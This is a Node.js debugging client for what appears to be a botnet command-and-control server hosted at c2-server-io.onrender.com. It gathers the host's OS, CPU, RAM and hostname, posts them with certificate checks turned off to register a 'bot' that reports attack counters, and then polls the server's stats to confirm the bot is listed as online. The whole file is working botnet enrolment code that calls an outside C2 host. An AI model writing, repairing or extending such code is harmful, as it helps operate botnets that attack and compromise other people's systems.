// debug_client.js
const https = require('https');
const crypto = require('crypto');
const os = require('os');

console.log('='.repeat(70));
console.log('  DEBUG MODE - FINDING CONNECTION ISSUE');
console.log('='.repeat(70));

// Create test data
const botId = 'JS-DEBUG-' + Date.now();
const testData = {
    bot_id: botId,
    specs: {
        os: os.platform(),
        cpu_cores: os.cpus().length,
        ram_gb: Math.round(os.totalmem() / (1024 ** 3) * 10) / 10,
        hostname: os.hostname(),
        capabilities: {
            javascript: true,
            http: true,
            tcp: true,
            udp: true,
            python: false,
            java: false
        }
    },
    stats: {
        total_attacks: 0,
        successful_attacks: 0,
        total_requests: 0
    }
};

console.log('\n[1] Test Data to send:');
console.log(JSON.stringify(testData, null, 2));

console.log('\n[2] Making request to server...');

const options = {
    hostname: 'c2-server-io.onrender.com',
    port: 443,
    path: '/check_approval',
    method: 'POST',
    headers: {
        'Content-Type': 'application/json',
        'User-Agent': 'NodeJS-Debug-Client',
        'Accept': 'application/json'
    },
    rejectUnauthorized: false,
    timeout: 15000
};

const req = https.request(options, (res) => {
    console.log('\n[3] Server Response:');
    console.log(`    Status Code: ${res.statusCode}`);
    console.log('    Headers:', JSON.stringify(res.headers, null, 2));
    
    let responseData = '';
    
    res.on('data', (chunk) => {
        responseData += chunk;
    });
    
    res.on('end', () => {
        console.log('\n[4] Response Body:');
        try {
            const parsed = JSON.parse(responseData);
            console.log(JSON.stringify(parsed, null, 2));
            
            if (parsed.approved) {
                console.log('\n' + '='.repeat(70));
                console.log('  ✅ SUCCESS! Bot should appear in dashboard.');
                console.log('='.repeat(70));
                console.log(`Bot ID: ${botId}`);
                console.log(`Client Type: ${parsed.client_type}`);
                console.log('\nRefresh dashboard to see your bot!');
            } else {
                console.log('\n❌ Bot NOT approved:', parsed);
            }
        } catch (e) {
            console.log('Raw response:', responseData);
        }
        
        // Now test if bot appears in stats
        console.log('\n[5] Checking dashboard stats...');
        checkStats();
    });
});

req.on('error', (err) => {
    console.error('\n[!] Request Error:', err.message);
    console.error('Full error:', err);
});

req.on('timeout', () => {
    console.error('\n[!] Request Timeout');
    req.destroy();
});

req.write(JSON.stringify(testData));
req.end();

// Function to check if bot appears in stats
function checkStats() {
    console.log('\n[6] Fetching server stats...');
    
    const statsReq = https.request({
        hostname: 'c2-server-io.onrender.com',
        port: 443,
        path: '/api/stats',
        method: 'GET',
        rejectUnauthorized: false,
        timeout: 10000
    }, (res) => {
        let statsData = '';
        
        res.on('data', (chunk) => {
            statsData += chunk;
        });
        
        res.on('end', () => {
            try {
                const stats = JSON.parse(statsData);
                console.log('\n[7] Current Server Stats:');
                console.log(`    Total Bots: ${stats.approved_bots}`);
                console.log(`    Online Bots: ${stats.online_bots}`);
                
                // Check if our bot is in the list
                if (stats.approved && stats.approved.length > 0) {
                    console.log('\nConnected Bots:');
                    stats.approved.forEach(bot => {
                        console.log(`    - ${bot.bot_id} (${bot.client_type}) - ${bot.online ? 'ONLINE' : 'OFFLINE'}`);
                    });
                    
                    const found = stats.approved.find(b => b.bot_id === botId);
                    if (found) {
                        console.log(`\n✅ YOUR BOT "${botId}" IS CONNECTED!`);
                        console.log(`   Status: ${found.online ? 'ONLINE' : 'OFFLINE'}`);
                        console.log(`   Client Type: ${found.client_type}`);
                    } else {
                        console.log(`\n❌ Your bot "${botId}" NOT found in connected list.`);
                        console.log('   Possible issue: Server not storing bots in memory');
                    }
                } else {
                    console.log('\n❌ No bots connected. Server may have memory issues.');
                }
            } catch (e) {
                console.log('Stats response:', statsData);
            }
        });
    });
    
    statsReq.on('error', (err) => {
        console.error('Stats request error:', err.message);
    });
    
    statsReq.end();
}
